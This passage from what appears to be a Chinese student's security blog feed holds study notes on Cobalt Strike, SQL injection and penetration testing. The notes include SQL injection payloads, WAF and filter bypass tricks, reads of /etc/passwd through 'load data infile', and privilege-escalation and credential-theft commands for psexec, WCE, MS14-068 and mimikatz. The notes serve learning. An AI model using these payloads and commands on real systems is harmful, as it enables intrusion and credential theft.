192.168.150.132 password &amp;（回车两次）</p><blockquote><p>开启团队服务器,服务端即可在后台运行</p><p><code>nohup</code>和<code>&amp;</code>表示在后台运行</p><p>./teamserver为团队服务器启动程序</p></blockquote></li><li><p>java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar</p></li></ol></li><li><p>就一个启动搞了半天，好气哦</p></li></ol><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201105140849579.png" alt="image-20201105140849579"></p><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201105141002935.png" alt="image-20201105141002935"></p><h2 id="建立Listener"><a href="#建立Listener" class="headerlink" title="建立Listener"></a>建立Listener</h2><h2 id="文件浏览器"><a href="#文件浏览器" class="headerlink" title="文件浏览器"></a>文件浏览器</h2><p>##生成一个木马</p><h2 id="网站克隆"><a href="#网站克隆" class="headerlink" title="网站克隆"></a>网站克隆</h2><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h2 id="获取Hash"><a href="#获取Hash" class="headerlink" title="获取Hash"></a>获取Hash</h2><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h2 id="内网代理——cobaltstrike代理"><a href="#内网代理——cobaltstrike代理" class="headerlink" title="内网代理——cobaltstrike代理"></a>内网代理——cobaltstrike代理</h2><h2 id="过360-Defender"><a href="#过360-Defender" class="headerlink" title="过360+Defender"></a>过360+Defender</h2><h2 id="绕过流量审计"><a href="#绕过流量审计" class="headerlink" title="绕过流量审计"></a>绕过流量审计</h2><p><a href="https://paper.seebug.org/1349/" target="_blank" rel="noopener">https://paper.seebug.org/1349/</a></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p><a href="http://blog.nsfocus.net/cobalt-strike-phishing-0913/" target="_blank" rel="noopener">http://blog.nsfocus.net/cobalt-strike-phishing-0913/</a></p><h2 id="内网流量规避"><a href="#内网流量规避" class="headerlink" title="内网流量规避"></a>内网流量规避</h2><p><a href="https://www.anquanke.com/post/id/210848#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/210848#h2-1</a></p><h4 id="IPS"><a href="#IPS" class="headerlink" title="IPS"></a>IPS</h4><h4 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a>IDS</h4><h1 id="看了这么多文章问问自己它可以用来干嘛"><a href="#看了这么多文章问问自己它可以用来干嘛" class="headerlink" title="看了这么多文章问问自己它可以用来干嘛"></a>看了这么多文章问问自己它可以用来干嘛</h1><h1 id="感觉好多坑，好烦哦"><a href="#感觉好多坑，好烦哦" class="headerlink" title="感觉好多坑，好烦哦"></a>感觉好多坑，好烦哦</h1><ol><li><a href="https://blog.csdn.net/weixin_41585557/article/details/88357980" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41585557/article/details/88357980</a></li><li>./teamserver permission denied</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="2020/11/04/sql-zhu-ru/"/>
      <url>2020/11/04/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<center>sql注入做题学习总结</center><h1 id="首先看师傅怎么学的，不然总感觉自己花时间还像是学到了假的东西"><a href="#首先看师傅怎么学的，不然总感觉自己花时间还像是学到了假的东西" class="headerlink" title="首先看师傅怎么学的，不然总感觉自己花时间还像是学到了假的东西"></a>首先看师傅怎么学的，不然总感觉自己花时间还像是学到了假的东西</h1><p><a href="https://www.cnblogs.com/hnsya/p/9370081.html" target="_blank" rel="noopener">https://www.cnblogs.com/hnsya/p/9370081.html</a></p><p><a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170626</a></p><p><a href="https://www.cnblogs.com/Mrsm1th/p/6842300.html" target="_blank" rel="noopener">https://www.cnblogs.com/Mrsm1th/p/6842300.html</a></p><h1 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h1><ol><li><p>基于从服务器接收到的响应（SQL注入开发技术）</p><ul><li><p>基于错误的 SQL 注入（error based exploitation）</p></li><li><p>联合查询的类型（Union Based Exploitation）</p></li><li><p>堆查询注射</p></li><li><p>SQL 盲注（Blind SQLI）：在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注</p><ul><li><p>基于布尔 SQL 盲注（Boolen Based Exploitation）</p></li><li><p>基于时间的 SQL 盲注（Time  Based Exploitation）</p><table><thead><tr><th align="left">Mysql</th><th>BENCHMARK(100,MD5(1)   or slep(5)</th></tr></thead><tbody><tr><td align="left">Postgresql</td><td>PG_SLEP(5)   OR GENRATE_SERIES(1,00)</td></tr><tr><td align="left">Msql   server</td><td>WAITFOR   DELAY ‘0:5’</td></tr></tbody></table><blockquote><p>BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种<strong><code>边信道攻击</code></strong></p></blockquote></li><li><p>sleep（x）</p></li><li><p>benchmark（）</p></li><li><p>笛卡尔积</p></li><li><p>get_lock</p></li><li><p>rlike+rpad</p></li></ul></li></ul></li><li><p>基于如何处理输入的 SQL 查询（数据类型）</p><ul><li>基于字符串</li></ul><ul><li>数字或整数为基础的</li></ul></li><li><p>基于程度和顺序的注入(哪里发生了影响)</p><ul><li>一阶注射：一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；</li><li>二阶注射：二阶注入类似存储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间接的对 WEB 产生危害，这样的就被称为是二阶注入. </li><li>二次注入：就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题（详见第24题）</li></ul></li><li><ul><li><p>基于注入点的位置上的</p></li><li><p>通过用户输入的表单域的注射</p><ul><li>通过 cookie 注射</li><li>通过服务器变量注射（基于头部信息的注射）</li></ul></li></ul></li><li><p>联合查询注入</p></li><li><p>布尔盲注</p><p>返回值为True或False类型：如果查询结果不为空，则返回True（或者是Success之类的），否则返回False，这种注入比较简单，可以挨个猜测表名、字段名和字段值的字符，通过返回结果判断猜测是否正确</p><p>例：parameter=’ or ascii(substr((select database()) ,1,1))&lt;115—+</p></li><li><p>Order by盲注</p><p>order by rand(True)和order by rand(False)的结果排序是不同的，可以根据这个不同来进行盲注：</p><p>例：</p><p>order by rand(database()=’pdotest’)</p><p>返回了True的排序，说明database()=’pdotest’是正确的值</p></li><li><p>延时盲注</p></li><li><p>宽字节注入</p></li><li><p>堆叠注入（stacked injection）：MySQL 的命令行中，每一条语句以;结尾，这代表语句的结束，如果在注入过程中在;后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入</p><p>详见第38题</p></li><li><p>报错注入</p><blockquote><p>前提：服务器开启报错信息返回，也就是发生错误时返回报错信息</p></blockquote><blockquote><p>原理：通过特殊函数使用并使其输出错误结果来获取信息，主要是利用mysql的逻辑漏洞</p></blockquote><ul><li><ul><li>bigint等是数据类型溢出</li><li>函数参数格式错误</li><li>主键/字段重复</li></ul></li><li><p>常见10种报错手段</p><ul><li><p>floor()</p><pre class=" language-mysql"><code class="language-mysql">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre></li><li><p>extractvalue()</p><pre class=" language-mysql"><code class="language-mysql">select * from est where id=1 and (extractvalue(1,concat(0x7e,(select         user()),0x7e)));</code></pre></li><li><p>updatexml(XML_document, XPath_string, new_value)：通常在第二个xpath参数填写我们要查询的内容</p><pre class=" language-mysql"><code class="language-mysql">select * from test where id=1 and (updatexml(1,concat(0x7e,(select         user()),0x7e),1));</code></pre></li><li><p>geometrycollection()</p><pre class=" language-mysql"><code class="language-mysql">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</code></pre></li><li><p>multipoint()</p><pre class=" language-mysql"><code class="language-mysql">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</code></pre></li><li><p>polygon()</p><pre class=" language-mysql"><code class="language-mysql">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</code></pre></li><li><p>multipolygon()</p><pre class=" language-mysql"><code class="language-mysql">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</code></pre></li><li><p>linestring()</p><pre class=" language-mysql"><code class="language-mysql">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</code></pre></li><li><p>multilinestring()</p><pre class=" language-mysql"><code class="language-mysql">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</code></pre></li><li><p>exp()：会返回e的x次方结果</p><pre class=" language-mysql"><code class="language-mysql">select * from test where id=1 and exp(~(select * from(select user())a));</code></pre></li></ul></li></ul></li></ol><h1 id="常见注入点—应用程序和数据交互的地方"><a href="#常见注入点—应用程序和数据交互的地方" class="headerlink" title="常见注入点—应用程序和数据交互的地方"></a>常见注入点—应用程序和数据交互的地方</h1><ul><li><p>Authentication（认证页面）</p><ul><li>Search Fields       （搜索页面）</li></ul></li><li><p>Post Fields   （Post请求）</p></li><li><p>Get Fields   （Get请求）</p></li><li><p>HTTP  Header（HTTP头部）</p></li><li><p>Cookie</p></li></ul><h1 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h1><h1 id="http分割注入"><a href="#http分割注入" class="headerlink" title="http分割注入"></a>http分割注入</h1><h1 id="截取字符串常用函数"><a href="#截取字符串常用函数" class="headerlink" title="截取字符串常用函数"></a>截取字符串常用函数</h1><ul><li><p>mid（）</p></li><li><p>substr（）</p></li><li><p>left（）</p></li><li><p>ascii（）：转换成ascii值</p></li><li><p>ord（）：转换成ascii值</p></li><li><p>regexp正则注入-&gt;匹配内容</p><ul><li>like匹配注入</li><li>基于报错的 SQL 盲注–构造payload 让信息通过错误提示回显出来</li></ul></li><li><p>利用数据表进行一次完整的注入：</p><blockquote><p>猜数据库-&gt;猜数据表-&gt;猜表的某列-&gt;获取某列内容</p></blockquote></li></ul><h1 id="常用SQL注入字符"><a href="#常用SQL注入字符" class="headerlink" title="常用SQL注入字符"></a>常用SQL注入字符</h1><table><thead><tr><th>1</th><th>字符串运算符</th><th>‘or’</th></tr></thead><tbody><tr><td>2</td><td>多行注释</td><td>/<em>…</em>/</td></tr><tr><td>3</td><td>加号，连接（在URL中等同于空格）</td><td>+</td></tr><tr><td>4</td><td>单行注释</td><td>#或–</td></tr><tr><td>5</td><td>双管道（连接）</td><td>||</td></tr><tr><td>6</td><td>通配符</td><td>%</td></tr><tr><td>7</td><td>局部变量</td><td>@</td></tr><tr><td>8</td><td>全局变量</td><td>@@</td></tr><tr><td>9</td><td>时延</td><td>waitfor delay ‘00:00:10’</td></tr><tr><td>10</td><td>字符串替代数字或数字替代字符串</td><td></td></tr></tbody></table><h1 id="数据库指纹：即根据错误信息找出数据库类型"><a href="#数据库指纹：即根据错误信息找出数据库类型" class="headerlink" title="数据库指纹：即根据错误信息找出数据库类型"></a>数据库指纹：即根据错误信息找出数据库类型</h1><h1 id="修复语法错误"><a href="#修复语法错误" class="headerlink" title="修复语法错误"></a>修复语法错误</h1><p>   注释剩余查询：根据数据库类型，通常使用<strong>–+</strong>或者<strong>#</strong></p><p>​    –%20：URL编码为空格</p><p>​    %23：URL编码为空格</p><ul><li><ul><li>爆数据库</li><li>爆数据表</li><li>爆数据表的列</li><li>爆数据</li></ul><table><thead><tr><th><strong>符号</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>%09</td><td>TAB 键(水平)</td></tr><tr><td>%0a</td><td>新建一行</td></tr><tr><td>%0c</td><td>新的一页</td></tr><tr><td>%0d</td><td>return 功能</td></tr><tr><td>%0b</td><td>TAB 键(垂直)</td></tr><tr><td>%a0</td><td>空格</td></tr></tbody></table></li></ul><ul><li><p>-+（连字符加）</p></li><li><p>#（散列）</p></li><li><ul><li>group  concat 关键字一次一起获取所有表名</li><li>逐个检查表名的方法</li></ul></li><li><p>使用 (‘) 来中断语句以接收一条 SQL 错误消息，从而检查 SQL 注入漏洞</p></li></ul><h1 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h1><ul><li>防御<ul><li>给username字段添加unique属性</li><li>使用id字段作为判断用户的凭证。</li><li>插入数据前判断数据长度。</li></ul></li></ul><h1 id="基础绕过"><a href="#基础绕过" class="headerlink" title="基础绕过"></a>基础绕过</h1><ol><li><p>大小写绕过：用于过滤时没有匹配大小写的情况：</p><blockquote><p>SelECt * from table;</p></blockquote></li><li><p>双写绕过</p><blockquote><p>用于将禁止的字符直接删掉的过滤情况如preg_replace(‘/select/‘,’’,input)</p><p>则可用seselectlect from xxx来绕过，在删除一个select后剩下的就是select from xxx</p></blockquote></li><li><p>添加注释</p><blockquote><p>/*! */类型的注释，内部的语句会被执行</p><p>可以用来绕过一些WAF，或者绕过空格</p><p>但是，不能将关键词用注释分开，例如下面的语句是不可以执行的（或者说只能在某些较老的版本执行）：</p><p>select bbb from table1 where balabala=’’ union se/<em>!lect database()</em>/;</p></blockquote></li><li><p>使用16进制绕过特定字符</p><blockquote><p>如果在查询字段名的时候表名被过滤，或是数据库中某些特定字符被过滤，则可用16进制绕过：</p><p>select column_name from information_schema.columns where table_name=0x7573657273;</p></blockquote></li><li><p>宽字节、Latin1默认编码</p><ol><li><p>宽字节注入</p><ol><li><p>gbk编码</p></li><li><p>Latin1编码</p><blockquote><p>Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有而utf8中没有的字符，而Mysql是如何处理这些字符的呢？直接忽略</p><p>于是我们可以输入?username=admin%c2，存储至表中就变为了admin</p></blockquote></li></ol><p>上面的%c2可以换为%c2-%ef之间的任意字符</p></li></ol></li></ol><ul><li><p>各个字符以及函数的代替</p><ul><li>数字的代替</li></ul><ul><li>常用字符的替代</li><li>常用函数的替代</li></ul></li><li><p>逗号被过滤</p></li><li><p>limit被过滤</p></li><li><p>Information_schema被过滤</p></li><li><p>and or &amp;&amp;      ||被过滤</p></li></ul><h1 id="特定场景的绕过"><a href="#特定场景的绕过" class="headerlink" title="特定场景的绕过"></a>特定场景的绕过</h1><ul><li>表名已知字段名未知的注入</li></ul><ul><li><p>堆叠注入&amp;select被过滤</p></li><li><ul><li>预编译</li><li>Handler</li></ul></li><li><p>PHP正则回溯BUG</p></li><li><p>PDO场景下的SQL注入</p></li><li><p>limit注入（5.7版本已经废除）</p></li><li><p>特殊的盲注</p><ul><li>查询成功与mysql error</li></ul><ul><li>Mysql error的前提下延时与不延时</li><li>表名未知</li></ul></li></ul><h1 id="文件的读写"><a href="#文件的读写" class="headerlink" title="文件的读写"></a>文件的读写</h1><ul><li>读写权限</li></ul><ul><li>读文件</li><li>mysql任意文件读取漏洞</li><li>写文件</li></ul><h1 id="DNSLOG（OOB注入）"><a href="#DNSLOG（OOB注入）" class="headerlink" title="DNSLOG（OOB注入）"></a>DNSLOG（OOB注入）</h1><ul><li>应用场景<ul><li>三大注入无法使用</li><li>有文件读取权限及secure-file-priv无值。</li><li>不知道网站/目标文件/目标目录的绝对路径</li><li>目标系统为Windows</li></ul></li></ul><h1 id="查"><a href="#查" class="headerlink" title="查"></a>查</h1><ol><li><blockquote><p>有回显（以下下种方法都可使用）</p></blockquote><ul><li><p>联合查询注入</p><ul><li><p>查询步骤：</p><p>1：先确定字段数量</p><p>2：判断页面回显数据的字段位置</p><p>3：在显示的字段位置使用子查询查数据，或直接查询</p></li><li><p>查询数据库名database（）、数据库账号user（）、数据库版本version（)等情况，再根据不同版本、不同的权限确定接下来的方法</p><ul><li><p>MySQL版本&lt;5.0（缺乏系统库information_schema）</p><ul><li>多字段</li><li>单字段</li></ul></li><li><p>&gt;=5.0</p><ul><li><p>Information_schema查询全部数据库名</p></li><li><pre class=" language-mysql"><code class="language-mysql">union select       1,2,group_concat(table_name),4,xxxx from information_schema.tables where       table_schema=database();</code></pre></li></ul></li></ul></li></ul></li></ul></li><li><p>无回显</p></li></ol><ul><li><p>报错注入</p></li><li><p>盲注（针对不直接返回数据+不返回报错信息的情况）</p></li><li><ul><li>布尔盲注</li></ul></li><li><p>select * from users where username=nouser or length(database())&gt;8</p></li><li><p>select * from users where username=nouser or ascii(substr(database(),1,1))&lt;130</p></li><li><ul><li><p>时间盲注:通过页面返回的延迟时间来判断是否正确</p></li><li><ul><li>select * from       users where username=$username (and | or)       if(length(database())&gt;8,sleep(3),1)</li><li>Sleep()</li><li>benchmark（）</li><li>复杂运算的函数</li><li>笛卡尔积合并数据表</li><li>GET_LOCK双SESSION产生延迟</li></ul></li></ul></li></ul><h1 id="增删改"><a href="#增删改" class="headerlink" title="增删改"></a>增删改</h1><ul><li><ul><li>可简单当做无回显的Select语句进行注入。值得注意的是，通常增insert处的注入点在测试时会产生大量的垃圾数据，删delete处的注入千万要注意where条件不要为永真。</li></ul></li><li><p>常见防御手段绕过</p></li><li><ul><li><p>过滤与拦截</p></li><li><ul><li><p>过滤：指的是我们输入的部分内容在拼接SQL语句之前被程序删除掉了，接着将过滤之后的内容拼接到SQL语句并继续与数据库通信</p></li><li><p>拦截：若检测到指定的内容存在，则直接返回拦截页面，同时不会进行拼接SQL语句并与数据库通信的操作</p></li><li><ul><li><p>and/or         被过滤/拦截</p></li><li><ul><li>双写anandd、oorr</li><li>使用运算符代替&amp;&amp;、||</li><li>直接拼接=号，如：?id=1=(condition)</li><li>其他方法，如：?id=1^(condition</li></ul></li><li><p>空格被过滤/拦截</p></li><li><ul><li>多层括号嵌套</li><li>改用+号</li><li>使用注释代替</li><li>and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略</li><li>%09, %0a, %0b,          %0c, %0d, %a0等部分不可见字符可也代替空格</li></ul></li></ul></li></ul></li></ul></li><li><p>如：select * from user where username=’admin’union(select+title,content/<strong>/from/<em>!article</em>/where/</strong>/id=’1’and!!!!~~1=1)</p></li><li></li><li><ul><li>括号被过滤/拦截</li></ul></li><li><p>order by 大小比较盲注</p></li><li><ul><li><p>逗号被过滤/拦截</p></li><li><ul><li>改用盲注</li><li>使用join语句代替</li><li>substr(data from       1 for 1)相当于substr(data,1,1)、limit 9 offset 4相当于limt 9,4</li></ul></li></ul></li><li><ul><li><p>其他系统关键字被过滤/拦截</p></li><li><ul><li>双写绕过关键字过滤</li><li>使用同义函数/语句代替，如if函数可用case       when condition then 1 else 0 end语句代替。</li></ul></li></ul></li><li><ul><li><p>单双引号被过滤/拦截/转义</p></li><li><ul><li>需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。</li><li>不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。</li></ul></li></ul></li><li><ul><li>数字被过滤/拦截</li></ul></li></ul><h1 id="读取文件三种方法（连接数据库时可读取文件）：相当于对客户端进行半劫持，通过构建恶意服务端实现"><a href="#读取文件三种方法（连接数据库时可读取文件）：相当于对客户端进行半劫持，通过构建恶意服务端实现" class="headerlink" title="读取文件三种方法（连接数据库时可读取文件）：相当于对客户端进行半劫持，通过构建恶意服务端实现"></a>读取文件三种方法（连接数据库时可读取文件）：相当于对客户端进行半劫持，通过构建恶意服务端实现</h1><ul><li><p>Load_file()</p></li><li><p>读取服务端文件</p><pre class=" language-mysql"><code class="language-mysql">load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取服务端文件</code></pre></li><li><p>读取客户端文件</p><pre class=" language-mysql"><code class="language-mysql">load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取客户端文件</code></pre></li><li><p>Local data local</p></li><li><ul><li><p>写文件</p></li><li><ul><li>日志法：利用生成日志文件的方法来绕过，但是要求权限够并且知道目标目录的绝对路径</li></ul></li><li><p>PHP/union.+?select/ig绕过</p></li><li><p>无列名盲注</p></li><li><p>UPDATE注入重复字段赋值</p></li><li><p>LIMIT之后的字段数判断</p></li></ul></li><li><p><strong>基于联合查询的**</strong>SQL<strong>**注入</strong></p></li><li><table><thead><tr><th>Variable/function</th><th>Output</th></tr></thead><tbody><tr><td>user()</td><td>Current User当前用户</td></tr><tr><td>database()</td><td>Current Database当前数据库</td></tr><tr><td>version()</td><td>Database Version数据库版本</td></tr><tr><td>schema()</td><td>Current Database当前数据库</td></tr><tr><td>UUID()</td><td>System UUID Key系统   UUID 密钥</td></tr><tr><td>current_user()</td><td>Current User</td></tr><tr><td>system_user()</td><td>Current System User</td></tr><tr><td>session_user()</td><td>Session User会话用户</td></tr><tr><td>@@hostname</td><td>Current Hostname当前主机名</td></tr><tr><td>@@tmpdir</td><td>Temporary Directory临时目录</td></tr><tr><td>@@datadir</td><td>Data DirectoryData 目录</td></tr><tr><td>@@version</td><td>Version of Database数据库的版本</td></tr><tr><td>@@basedir</td><td>Base Directory基本目录</td></tr><tr><td>@@GLOBAL.have_symlink</td><td>Check if symlink is Enabled or Disabled检查 symlink 是启用还是禁用</td></tr><tr><td>@@GLOBAL.have_ssl</td><td>Check if it SSL is available检查是否有可用的 ssl</td></tr></tbody></table></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>视频里面我到底学了个啥，总结看看</title>
      <link href="2020/10/29/shi-pin-li-mian-wo-dao-di-xue-liao-ge-sha-zong-jie-kan-kan/"/>
      <url>2020/10/29/shi-pin-li-mian-wo-dao-di-xue-liao-ge-sha-zong-jie-kan-kan/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap（详见SQLmap）"><a href="#sqlmap（详见SQLmap）" class="headerlink" title="sqlmap（详见SQLmap）"></a>sqlmap（详见SQLmap）</h1><h1 id="xss（详见xss）"><a href="#xss（详见xss）" class="headerlink" title="xss（详见xss）"></a>xss（详见xss）</h1><h1 id="SQL注入（详见SQL注入）"><a href="#SQL注入（详见SQL注入）" class="headerlink" title="SQL注入（详见SQL注入）"></a>SQL注入（详见SQL注入）</h1><h1 id="burpsuite（详见burpsuite）"><a href="#burpsuite（详见burpsuite）" class="headerlink" title="burpsuite（详见burpsuite）"></a>burpsuite（详见burpsuite）</h1><h1 id="crsf"><a href="#crsf" class="headerlink" title="crsf"></a>crsf</h1><h1 id="翻墙-amp-代理"><a href="#翻墙-amp-代理" class="headerlink" title="翻墙&amp;代理"></a>翻墙&amp;代理</h1><h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><h1 id="NETCAT"><a href="#NETCAT" class="headerlink" title="NETCAT"></a>NETCAT</h1><h1 id="TCPDUMP"><a href="#TCPDUMP" class="headerlink" title="TCPDUMP"></a>TCPDUMP</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="DNS信息收集——NSLOOKUP"><a href="#DNS信息收集——NSLOOKUP" class="headerlink" title="DNS信息收集——NSLOOKUP"></a>DNS信息收集——NSLOOKUP</h2><h2 id="DNS信息收集——DIG"><a href="#DNS信息收集——DIG" class="headerlink" title="DNS信息收集——DIG"></a>DNS信息收集——DIG</h2><h2 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h2><h2 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h2><h2 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h2><h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><h2 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h2><h2 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h2><h1 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h1><ol><li>发现</li><li>发现——二层发现</li><li>发现——三层发现</li><li>发现——四层发现</li><li>端口扫描</li><li>隐蔽端口扫描</li><li>全连接端口扫描</li><li>僵尸扫描</li><li>服务扫描<ol><li>服务扫描——banner</li><li>服务扫描——服务识别</li></ol></li><li>操作系统识别</li><li>SNMP扫描</li><li>SMB扫描</li><li>防火墙识别</li><li>负载均衡识别</li><li>WAF识别</li><li>NMAP</li></ol><h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><ol><li>CVSS</li><li>CVE</li><li>Vulnerability Reference</li><li>OVAL</li><li>CCE</li><li>CPE</li><li>CWE</li><li>Security Content Automation Protocol（SCAP）<ol><li>主要解决三个问题</li><li>SCAP是当前美国比较成熟的一套信息安全评估标准体系，其标准化、自动化的思想对信息安<br>全行业产生了深远的影响。</li></ol></li><li>NVD<ol><li><a href="https://nvd.nist.gov/" target="_blank" rel="noopener">https://nvd.nist.gov/</a></li><li><ol><li>美国政府的漏洞管理标准数据</li><li>完全基于SCAP框架</li><li>实现自动化漏洞管理、安全测量、合规要求</li><li>包含以下库安<ol><li>全检查列表</li><li>软件安全漏洞</li><li>配置错误</li><li>产品名称</li><li>影响度量</li></ol></li></ol></li></ol></li><li>nmap</li><li>openvas</li><li>Nessus</li></ol><h1 id="缓冲区溢出（windows和linux）"><a href="#缓冲区溢出（windows和linux）" class="headerlink" title="缓冲区溢出（windows和linux）"></a>缓冲区溢出（windows和linux）</h1><ol><li>如何发现漏洞<ol><li>源码审计</li><li>逆向工程</li><li>模糊测试</li><li>向程序堆栈半随机的数据，根据内存变化判断溢出</li><li>数据生成器：生成随机、半随机数据</li><li>测试工具：识别溢出漏洞</li></ol></li><li>FUZZER<ol><li>2700个字符实现EIP 寄存器溢出</li><li>找到精确溢出的4 个字节<ol><li>二分法</li><li>唯一字串法</li></ol></li></ol></li><li>POP3<ol><li>110端口</li></ol></li><li>选择修改EXP<ol><li>Exploit-db</li><li>SecurityFocus</li><li>Searchsploit</li></ol></li><li>漏洞利用<ol><li>上传工具</li><li>提权</li><li>擦除攻击痕迹</li><li>安装后门<ol><li>长期控制</li><li>Dump 密码</li><li>内网渗透</li></ol></li><li>后漏洞利用阶段<ol><li>最大的挑战 ——防病毒软件</li><li>使用合法的远程控制软件</li></ol></li><li>上传文件</li><li>linux系统<ol><li>netcat</li><li>curl</li><li>wget</li></ol></li><li>非交互模式shell</li><li>传输文件<ol><li>TFTP</li><li>FTP</li><li>VBScript</li><li>debug</li></ol></li></ol></li></ol><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ol><li><p>本地提权</p><ol><li>已实现本地低权限账号登录<ol><li>溢出</li><li>直接获得账号密码</li></ol></li><li>获得更高权限</li><li>系统账号间权限隔离<ol><li>用户空间</li><li>内核空间</li></ol></li><li>系统账号<ol><li>用户账号登陆时获取权限令牌</li><li>服务账号无需用户登陆已在后台启动服务</li></ol></li><li>windows<ol><li>user</li><li>administrator</li><li>system<ol><li>admin提权为system</li><li>Windows system账号<ol><li>系统设置管理功能</li><li>SysInternal Suite<ol><li><a href="https://technet.microsoft.com/en-us/sysinternals/bb545027" target="_blank" rel="noopener">https://technet.microsoft.com/en-us/sysinternals/bb545027</a></li><li>psexec -i -s -d taskmgr</li></ol></li><li>at 19:39 /interactive cmd</li><li>sc Create syscmd binPath= “cmd /K start” type= own type= interact</li><li>sc start syscmd</li></ol></li></ol></li></ol></li><li>Linux<ol><li>user</li><li>root</li></ol></li></ol></li><li><p>注入进程提权</p></li><li><p>抓包嗅探</p></li><li><p>键盘记录</p><ol><li>Keylogger</li><li>木马窃取</li></ol></li><li><p>本地缓存密码</p></li><li><p>windows身份认证过程</p><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201029193154591.png" alt=""></p></li><li><p>WCE(WINDOWS CREDENTIAL EDITOR)</p><ol><li>/usr/share/wce/</li><li>需要管理员权限</li><li>wce-universal.exe -l / -lv</li><li>wce-universal.exe -d</li><li>wce-universal.exe -e / -r</li><li>wce-universal.exe -g</li><li>wce-universal.exe -w</li><li>LM/NT hash</li><li>从内存读取LM / NTLM hash</li><li>Digest Authentication Package</li><li>NTLM Security Package</li><li>Kerberos Security Package</li><li>防止WCE攻击</li><li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</li><li>kerberos<br>msv1_0<br>schannel<br>wdigest<br>tspkg<br>pku2u</li></ol></li><li><p>利用漏洞提权</p><ol><li>Ms14-068</li><li>库<br><a href="https://github.com/bidord/pykek" target="_blank" rel="noopener">https://github.com/bidord/pykek</a></li><li>ms14-068.py -u <a href="mailto:user@lab.com">user@lab.com</a> -s userSID -d dc.lab.co</li><li>拷贝 <a href="mailto:TGT_user1@lab.com.ccache">TGT_user1@lab.com.ccache</a> 到windows系统</li><li>本地管理员登陆<br> mimikatz.exe log “kerberos::ptc <a href="mailto:TGT_user@lab.com.ccache">TGT_user@lab.com.ccache</a>“ exit</li><li>Ubuntu11.10<br> <a href="http://old-releases.ubuntu.com/releases/11.10/" target="_blank" rel="noopener">http://old-releases.ubuntu.com/releases/11.10/</a></li><li>gcc<br>sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc<br>gcc 18411.c -o exp</li><li>CVE-2012-0056<br>• /proc/pid/mem<br>• kernels &gt;=2.6.39<br>• <a href="http://blog.zx2c4.com/749" target="_blank" 